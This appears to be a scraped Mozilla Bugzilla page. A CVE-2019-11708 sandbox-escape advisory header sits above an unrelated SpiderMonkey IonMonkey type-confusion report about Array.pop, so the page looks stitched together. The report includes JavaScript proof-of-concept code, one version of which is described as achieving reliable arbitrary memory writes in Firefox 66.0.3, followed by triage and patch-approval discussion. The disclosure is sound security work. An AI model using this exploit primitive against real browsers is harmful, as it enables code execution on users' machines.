| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

* [Bug 1544386](https://bugzilla.mozilla.org/show_bug.cgi?id=1544386)

#### [#CVE-2019-11708: sandbox escape using Prompt:Open](#CVE-2019-11708)

Reporter
Coinbase Security
Impact
high
##### Description

Insufficient vetting of parameters passed with the `Prompt:Open` IPC message between child and parent processes can result in the non-sandboxed parent process opening web content chosen by a compromised child process. When combined with additional vulnerabilities this could result in executing arbitrary code on the user's computer.

|  | |

The following program (found through fuzzing and manually modified) crashes Spidermonkey built from the current beta channel and Firefox 66.0.3 (current stable):

```
// Run with --no-threads for increased reliability
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
function v7(v8,v9) {
    if (v4.length == 0) {
        v4[3] = {a: 5};
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when  p[0] is fetched here.
    const v11 = v4.pop();

    // Then if will crash here when dereferencing a controlled double value as pointer.
    v11.a;

    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
p[0] = -1.8629373288622089e-06;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}

```

When run, it produces a crash similar to the following:

```
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
    frame #0: 0x000025a3b99b26cb
->  0x25a3b99b26cb: cmp    qword ptr [rax], r11
    0x25a3b99b26ce: jne    0x25a3b99b26dd
    0x25a3b99b26d4: cmovne rax, rcx
    0x25a3b99b26d8: jmp    0x25a3b99b26f4
Target 0: (js) stopped.
(lldb) reg read rax
     rax = 0x4141414141414141

```

I haven't thoroughly analyzed bug, but here is roughly what appears to be happening:

* when v4 is created, it will have inferred types for its elements, indicating that they will be JSObjects (this can be seen by running the spidermonkey shell with `INFERFLAGS=full` in the environment)
* in the block following the function definition, v4's prototype is changed to a new object with a double as element 0. This does not change the inferred element types of v4, presumably because these only track own properties/elements and not from prototypes
* v7 is executed a few times and all original elements from v4 are popped
* the element assignment (`v4[3] = ...`) changes the length of the array (to 4) without changing the inferred element types

Afterwards, v7 is (re-)compiled by IonMonkey:

* the call to v4.pop() is inlined by IonMonkey and converted to an MArrayPopShift instruction [1]
* since the inferred element types (JSObjects) match the observed types, no type barrier is emitted [2, 3]
* IonMonkey now assumes that the result of v4.pop() will be an object, thus omits type checks and directly proceed with the property load
* Later, when generating machine code for v4.pop [4], IonMonkey generates a call to the runtime function ArrayPopDense [5]

At execution time of the JITed code, when v4.length is back at 1 (and so the only element left to pop is element 0), the following happens:

* The runtime call to ArrayPopDense is taken
* this calls js::array\_pop which in turn proceeds to load p[0] as v4 doesn't have a property with name '0'
* the array pop operation thus returns a double value

However, the JITed code still assumes that it received a JSObject\* from the array pop operation and goes on to dereference the value, leading to a crash at an attacker controlled address. It is likely possible to exploit this bug further as type inference issues are generally well exploitable.

To summarize, the problem seems to be that the code handling Array.pop in IonMonkey doesn't take into account that Array.prototype.pop can load an element from the prototype, which could conflict with the array's inferred element types.

Please note: this bug is subject to a 90 day disclosure deadline. After 90 days elapse or a patch has been made broadly available (whichever is earlier), the bug report will become visible to the public.

With any fix, please give credit for identifying the vulnerability to Samuel Groß of Google Project Zero.

Below is the original sample triggered by my fuzzer:

```
let v2 = 0;
v2 = 7;
const v4 = [13.37,13.37,13.37,13.37,13.37];
function v7(v8,v9) {
    const v10 = v2 + v4;
    v4[v10] = Object;
    const v11 = v4.pop();
    for (let v15 = 0; v15 < 100; v15++) {
    }
}
v4.__proto__ = Object;
for (let v19 = 0; v19 < 100; v19++) {
    const v23 = [-1000000000000.0,-1000000000000.0,-1000000000000.0];
    let v24 = Object;
    v24.__proto__ = v23;
    const v26 = String.fromCharCode(v19);
    Object[0] = v26;
}
for (let v31 = 0; v31 < 100; v31++) {
    const v32 = v7();
}

I'm a bit surprised about the sec-high rating as this issue is very similar to e.g. <https://bugzilla.mozilla.org/show_bug.cgi?id=1530958> and <https://bugzilla.mozilla.org/show_bug.cgi?id=1538120> which were both rated as sec-critical.

The following modification of the PoC achieves fast and reliable memory writes to arbitrary addresses in FireFox 66.0.3:

```
// Run with --no-threads for increased reliability
let ab = new ArrayBuffer(0x1000);

// Confuse these two types with each other below.
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(0x1000);

const v4 = [y, y, y, y, y];
function v7(v8,v9) {
    if (v4.length == 0) {
        v4[3] = y;
    }

    // pop the last value. IonMonkey will, based on inferred types, conclude that the result
    // will always be an object, which is untrue when p[0] is fetched here.
    const v11 = v4.pop();

    // It will then crash here when writing to a controlled address (0x414141414141).
    v11[0] = 0x1337;

    // Force JIT compilation.
    for (let v15 = 0; v15 < 10000; v15++) {}
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

for (let v31 = 0; v31 < 1000; v31++) {
    v7();
}

I believe that nowadays we're rating remote code execution in sandboxed content processes as sec-high and not sec-critical. [Bug 1530958](/show_bug.cgi?id=1530958 "RESOLVED FIXED - Spidermonkey: IonMonkey's type inference is incorrect for constructors entered via OSR") should probably have been sec-high and not sec-critical. Jan likely rated it the latter because we were marking bugs like this sec-critical up until the last year or so.

The bug here is that when we inline pop/shift and some other natives, we call ArrayPrototypeHasIndexedProperty but that makes no sense because these natives can be called with a |this| value that had its proto mutated to some other object.

This simplifies the code a bit because ElementAccessHasExtraIndexedProperty

checks for length-overflow and sparse-indexes so the callers don't have to

do that anymore.

These functions now don't have other callers and I find it easier to reason

about the code this way. It also prevents us from calling these helper functions

directly.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Hard to say. It's not super easy but it's possible.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: All
* **If not all supported branches, which bug introduced the flaw?**: Old bug
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: Pretty unlikely, we have tests for this and this makes us reuse more code we use elsewhere.
